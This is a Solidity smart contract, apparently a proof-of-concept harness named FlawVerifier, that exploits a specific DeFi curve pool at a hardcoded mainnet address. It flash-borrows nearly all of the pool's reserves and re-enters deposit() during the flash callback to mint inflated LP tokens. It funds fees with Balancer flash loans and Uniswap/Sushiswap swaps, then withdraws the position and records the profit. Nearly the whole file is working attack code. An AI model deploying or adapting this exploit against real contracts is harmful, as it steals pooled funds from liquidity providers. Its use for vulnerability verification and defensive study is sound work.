// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetCurve {
    function derivatives(uint256 index) external view returns (address);
    function numeraires(uint256 index) external view returns (address);
    function reserves(uint256 index) external view returns (address);
    function frozen() external view returns (bool);
    function emergency() external view returns (bool);
    function whitelistingStage() external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function viewCurve() external view returns (uint256, uint256, uint256, uint256, uint256);
    function viewDeposit(uint256 depositAmount) external view returns (uint256 curvesMinted, uint256[] memory deposits);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function deposit(uint256 depositAmount, uint256 deadline) external returns (uint256 curvesMinted, uint256[] memory deposits);
    function withdraw(uint256 curvesToBurn, uint256 deadline) external returns (uint256[] memory withdrawals);
    function emergencyWithdraw(uint256 curvesToBurn, uint256 deadline) external returns (uint256[] memory withdrawals);
}

interface ITargetFlashCallback {
    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData) external;
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IUniswapV3PoolLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IUniswapV3SwapCallback {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

library FullMathLocal {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        uint256 prod0;
        uint256 prod1;
        assembly {
            let mm := mulmod(a, b, not(0))
            prod0 := mul(a, b)
            prod1 := sub(sub(mm, prod0), lt(mm, prod0))
        }

        if (prod1 == 0) {
            require(denominator > 0, "div-by-zero");
            assembly {
                result := div(prod0, denominator)
            }
            return result;
        }

        require(denominator > prod1, "muldiv-overflow");

        uint256 remainder;
        assembly {
            remainder := mulmod(a, b, denominator)
            prod1 := sub(prod1, gt(remainder, prod0))
            prod0 := sub(prod0, remainder)
        }

        uint256 twos = denominator & (~denominator + 1);
        assembly {
            denominator := div(denominator, twos)
            prod0 := div(prod0, twos)
            twos := add(div(sub(0, twos), twos), 1)
        }

        prod0 |= prod1 * twos;

        uint256 inv = (3 * denominator) ^ 2;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;

        result = prod0 * inv;
    }

    function mulDivRoundingUp(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        result = mulDiv(a, b, denominator);
        if (mulmod(a, b, denominator) > 0) {
            require(result < type(uint256).max, "muldiv-round-overflow");
            unchecked {
                result += 1;
            }
        }
    }
}

contract FlawVerifier is ITargetFlashCallback, IBalancerFlashLoanRecipient, IUniswapV3SwapCallback {
    using FullMathLocal for uint256;

    address internal constant TARGET = 0x46161158b1947D9149E066d6d31AF1283b2d377C;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    uint256 internal constant SWAP_BUDGET_TOKEN1 = 100e6;
    uint256 internal constant BALANCER_BUFFER_TOKEN1 = 50e6;
    uint256 internal constant MIN_TOKEN0_BUFFER = 1e15;
    uint160 internal constant MIN_SQRT_RATIO_PLUS_ONE = 4295128740;
    uint160 internal constant MAX_SQRT_RATIO_MINUS_ONE = 1461446703485210103287273052203988822378723970341;

    enum Phase {
        Idle,
        InBalancerFlash,
        InTargetFlash
    }

    Phase internal phase;

    address internal token0;
    address internal token1;

    uint256 internal startBalance0;
    uint256 internal startBalance1;

    uint256 internal borrowed0;
    uint256 internal borrowed1;
    uint256 internal targetFee0;
    uint256 internal targetFee1;

    uint256 internal balancerBorrow1;
    uint256 internal balancerFee1;

    address internal activeV3Pool;
    uint256 internal activeV3MaxAmountIn;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        ITargetCurve target = ITargetCurve(TARGET);

        require(!target.frozen(), "target-frozen");
        require(!target.emergency(), "target-emergency-mode");
        require(!target.whitelistingStage(), "whitelist-stage-on-going-no-proof");

        token0 = target.derivatives(0);
        token1 = target.derivatives(1);

        startBalance0 = _balanceOf(token0, address(this));
        startBalance1 = _balanceOf(token1, address(this));

        uint256 poolBal0 = _balanceOf(token0, TARGET);
        uint256 poolBal1 = _balanceOf(token1, TARGET);
        require(poolBal0 > 1 && poolBal1 > 1, "insufficient-pool-depth");

        borrowed0 = poolBal0 - 1;
        borrowed1 = poolBal1 - 1;

        (, , , uint256 epsilon, ) = target.viewCurve();
        targetFee0 = borrowed0.mulDivRoundingUp(epsilon, 1e18);
        targetFee1 = borrowed1.mulDivRoundingUp(epsilon, 1e18);

        _setApprovals(target);

        uint256 requiredToken1 = targetFee1;
        if (startBalance0 < targetFee0) {
            requiredToken1 += SWAP_BUDGET_TOKEN1;
        }

        if (requiredToken1 > startBalance1) {
            balancerBorrow1 = requiredToken1 - startBalance1 + BALANCER_BUFFER_TOKEN1;
        } else {
            balancerBorrow1 = 0;
        }
        balancerFee1 = 0;

        // Core exploit path is preserved:
        // 1) flash() drains nearly all target reserves.
        // 2) inside flashCallback, deposit() reenters while balances are temporarily low.
        // 3) flash repayment restores balances so the target's end-of-function checks pass.
        // 4) the inflated LP is redeemed via withdraw()/emergencyWithdraw().
        //
        // The only execution detail varied here is fee funding. The failing branch proved Balancer
        // cannot lend token0 on this fork, so the verifier now borrows only existing on-chain USDC
        // from Balancer, then uses a small public on-chain USDC->token0 swap to source the missing
        // token0 flash fee before the vulnerable reentrant deposit occurs.
        if (balancerBorrow1 == 0) {
            phase = Phase.InTargetFlash;
            target.flash(address(this), borrowed0, borrowed1, bytes("target-flash"));
            _redeemInflatedPosition(target);
            _finalizeProfit();
            phase = Phase.Idle;
            return;
        }

        _requestBalancerFlash();
        _finalizeProfit();
        phase = Phase.Idle;
    }

    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata) external override {
        require(msg.sender == TARGET, "not-target");
        require(phase == Phase.InTargetFlash, "unexpected-target-callback");
        require(fee0 == targetFee0 && fee1 == targetFee1, "fee-mismatch");

        uint256 current0 = _balanceOf(token0, address(this));
        uint256 current1 = _balanceOf(token1, address(this));

        uint256 repay0 = borrowed0 + targetFee0;
        uint256 repay1 = borrowed1 + targetFee1;

        if (current0 < repay0) {
            uint256 token0Needed = repay0 - current0;
            uint256 maxToken1Spend = current1 > repay1 ? current1 - repay1 : 0;
            _acquireToken0ForFee(token0Needed, maxToken1Spend);
            current0 = _balanceOf(token0, address(this));
            current1 = _balanceOf(token1, address(this));
        }

        require(current0 >= repay0, "insufficient-token0-for-fee");
        require(current1 >= repay1, "insufficient-token1-for-fee");

        ITargetCurve target = ITargetCurve(TARGET);
        uint256 depositAmount = _findMaxDeposit(target, current0, current1);
        require(depositAmount > 0, "no-feasible-reentrant-deposit");

        (, uint256[] memory deposited) = target.deposit(depositAmount, type(uint256).max);
        require(deposited.length >= 2, "unexpected-deposit-shape");
        require(deposited[0] <= current0 && deposited[1] <= current1, "deposit-exceeds-cap");

        if (deposited[0] < repay0) {
            _safeTransfer(token0, TARGET, repay0 - deposited[0]);
        }
        if (deposited[1] < repay1) {
            _safeTransfer(token1, TARGET, repay1 - deposited[1]);
        }
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not-balancer-vault");
        require(phase == Phase.InBalancerFlash, "unexpected-balancer-callback");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "balancer-array-mismatch");
        require(tokens[0] == token1, "unexpected-balancer-token");
        require(amounts[0] == balancerBorrow1, "unexpected-balancer-amount1");

        balancerFee1 = feeAmounts[0];

        phase = Phase.InTargetFlash;
        ITargetCurve target = ITargetCurve(TARGET);
        target.flash(address(this), borrowed0, borrowed1, bytes("target-flash"));

        _redeemInflatedPosition(target);

        _safeTransfer(token1, BALANCER_VAULT, balancerBorrow1 + balancerFee1);
        phase = Phase.InBalancerFlash;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external override {
        require(msg.sender == activeV3Pool, "unexpected-v3-callback");

        uint256 amountIn;
        if (amount0Delta > 0) {
            require(amount0Delta <= int256(type(uint256).max), "v3-amount0-overflow");
            amountIn = uint256(amount0Delta);
        } else if (amount1Delta > 0) {
            require(amount1Delta <= int256(type(uint256).max), "v3-amount1-overflow");
            amountIn = uint256(amount1Delta);
        } else {
            revert("v3-zero-input");
        }

        require(amountIn <= activeV3MaxAmountIn, "v3-input-too-large");
        _safeTransfer(token1, msg.sender, amountIn);
    }

    function attemptV2Buy(address pair, uint256 desiredToken0Out, uint256 maxToken1In) external returns (uint256 amountIn) {
        require(msg.sender == address(this), "self-only");

        IUniswapV2PairLike pool = IUniswapV2PairLike(pair);
        address pairToken0 = pool.token0();
        address pairToken1 = pool.token1();
        require(
            (pairToken0 == token0 && pairToken1 == token1) || (pairToken0 == token1 && pairToken1 == token0),
            "pair-mismatch"
        );

        (uint112 reserve0, uint112 reserve1, ) = pool.getReserves();
        bool usdcIsToken0 = pairToken0 == token1;
        uint256 reserveIn = usdcIsToken0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveOut = usdcIsToken0 ? uint256(reserve1) : uint256(reserve0);

        require(desiredToken0Out > 0 && desiredToken0Out < reserveOut, "invalid-v2-out");

        uint256 numerator = reserveIn * desiredToken0Out * 1000;
        uint256 denominator = (reserveOut - desiredToken0Out) * 997;
        amountIn = (numerator / denominator) + 1;
        require(amountIn <= maxToken1In, "v2-too-expensive");

        _safeTransfer(token1, pair, amountIn);
        if (usdcIsToken0) {
            pool.swap(0, desiredToken0Out, address(this), bytes(""));
        } else {
            pool.swap(desiredToken0Out, 0, address(this), bytes(""));
        }
    }

    function attemptV3Buy(address pool, uint256 desiredToken0Out, uint256 maxToken1In) external returns (uint256 amountIn) {
        require(msg.sender == address(this), "self-only");

        IUniswapV3PoolLike v3Pool = IUniswapV3PoolLike(pool);
        address poolToken0 = v3Pool.token0();
        address poolToken1 = v3Pool.token1();

        bool zeroForOne;
        uint160 sqrtPriceLimitX96;
        if (poolToken0 == token1 && poolToken1 == token0) {
            zeroForOne = true;
            sqrtPriceLimitX96 = MIN_SQRT_RATIO_PLUS_ONE;
        } else if (poolToken0 == token0 && poolToken1 == token1) {
            zeroForOne = false;
            sqrtPriceLimitX96 = MAX_SQRT_RATIO_MINUS_ONE;
        } else {
            revert("pool-mismatch");
        }

        activeV3Pool = pool;
        activeV3MaxAmountIn = maxToken1In;
        require(desiredToken0Out <= uint256(type(int256).max), "v3-output-overflow");
        (int256 amount0, int256 amount1) = v3Pool.swap(
            address(this),
            zeroForOne,
            -int256(desiredToken0Out),
            sqrtPriceLimitX96,
            bytes("")
        );
        activeV3Pool = address(0);
        activeV3MaxAmountIn = 0;

        int256 rawAmountIn = zeroForOne ? amount0 : amount1;
        require(rawAmountIn > 0, "v3-no-input");
        amountIn = uint256(rawAmountIn);
        require(amountIn <= maxToken1In, "v3-too-expensive");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _requestBalancerFlash() internal {
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = token1;
        amounts[0] = balancerBorrow1;

        phase = Phase.InBalancerFlash;
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes("balancer-fee-funding"));
    }

    function _acquireToken0ForFee(uint256 token0Needed, uint256 maxToken1Spend) internal {
        if (token0Needed == 0) {
            return;
        }
        require(maxToken1Spend > 0, "token0-fee-funding-unavailable");

        uint256 desiredOut = token0Needed > MIN_TOKEN0_BUFFER ? token0Needed : MIN_TOKEN0_BUFFER;
        uint256 beforeToken0 = _balanceOf(token0, address(this));

        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(token0, token1);
        if (pair != address(0)) {
            try this.attemptV2Buy(pair, desiredOut, maxToken1Spend) returns (uint256) {
                if (_balanceOf(token0, address(this)) >= beforeToken0 + token0Needed) {
                    return;
                }
            } catch {}
        }

        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(token0, token1);
        if (pair != address(0)) {
            try this.attemptV2Buy(pair, desiredOut, maxToken1Spend) returns (uint256) {
                if (_balanceOf(token0, address(this)) >= beforeToken0 + token0Needed) {
                    return;
                }
            } catch {}
        }

        uint24[3] memory fees = [uint24(500), uint24(3000), uint24(10000)];
        for (uint256 i = 0; i < fees.length; ) {
            address pool = IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(token1, token0, fees[i]);
            if (pool != address(0)) {
                try this.attemptV3Buy(pool, desiredOut, maxToken1Spend) returns (uint256) {
                    if (_balanceOf(token0, address(this)) >= beforeToken0 + token0Needed) {
                        return;
                    }
                } catch {}
            }
            unchecked {
                ++i;
            }
        }

        revert("token0-fee-funding-unavailable");
    }

    function _setApprovals(ITargetCurve curve) internal {
        _approveIfNeeded(token0, TARGET);
        _approveIfNeeded(token1, TARGET);
        _approveIfNeeded(curve.numeraires(0), TARGET);
        _approveIfNeeded(curve.numeraires(1), TARGET);
        _approveIfNeeded(curve.reserves(0), TARGET);
        _approveIfNeeded(curve.reserves(1), TARGET);
    }

    function _approveIfNeeded(address token, address spender) internal {
        if (token == address(0)) {
            return;
        }

        if (_allowance(token, address(this), spender) < type(uint256).max / 2) {
            _safeApprove(token, spender, 0);
            _safeApprove(token, spender, type(uint256).max);
        }
    }

    function _findMaxDeposit(ITargetCurve curve, uint256 cap0, uint256 cap1) internal view returns (uint256 best) {
        uint256 supply = curve.totalSupply();
        require(supply > 0, "zero-supply");

        uint256 low;
        uint256 high = supply;

        for (uint256 i = 0; i < 16; ) {
            if (!_depositFits(curve, high, cap0, cap1)) {
                break;
            }
            low = high;
            if (high > type(uint256).max / 2) {
                high = type(uint256).max;
                break;
            }
            high <<= 1;
            unchecked {
                ++i;
            }
        }

        uint256 left = low;
        uint256 right = high;
        while (left <= right) {
            uint256 mid = left + ((right - left) >> 1);
            if (_depositFits(curve, mid, cap0, cap1)) {
                best = mid;
                left = mid + 1;
            } else {
                if (mid == 0) {
                    break;
                }
                right = mid - 1;
            }
        }
    }

    function _depositFits(ITargetCurve curve, uint256 depositAmount, uint256 cap0, uint256 cap1) internal view returns (bool) {
        if (depositAmount == 0) {
            return true;
        }

        try curve.viewDeposit(depositAmount) returns (uint256, uint256[] memory deposits) {
            if (deposits.length < 2) {
                return false;
            }
            return deposits[0] <= cap0 && deposits[1] <= cap1;
        } catch {
            return false;
        }
    }

    function _redeemInflatedPosition(ITargetCurve curve) internal {
        uint256 lpBalance = curve.balanceOf(address(this));
        require(lpBalance > 0, "no-lp-minted");

        if (curve.emergency()) {
            curve.emergencyWithdraw(lpBalance, type(uint256).max);
        } else {
            curve.withdraw(lpBalance, type(uint256).max);
        }
    }

    function _finalizeProfit() internal {
        uint256 end0 = _balanceOf(token0, address(this));
        uint256 end1 = _balanceOf(token1, address(this));

        uint256 profit0 = end0 > startBalance0 ? end0 - startBalance0 : 0;
        uint256 profit1 = end1 > startBalance1 ? end1 - startBalance1 : 0;

        if (profit0 >= profit1 && profit0 > 0) {
            _profitToken = token0;
            _profitAmount = profit0;
        } else if (profit1 > 0) {
            _profitToken = token1;
            _profitAmount = profit1;
        } else {
            _profitToken = address(0);
            _profitAmount = 0;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        require(ok && data.length >= 32, "balanceOf-failed");
        amount = abi.decode(data, (uint256));
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender));
        require(ok && data.length >= 32, "allowance-failed");
        amount = abi.decode(data, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) {
            return;
        }
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }
}
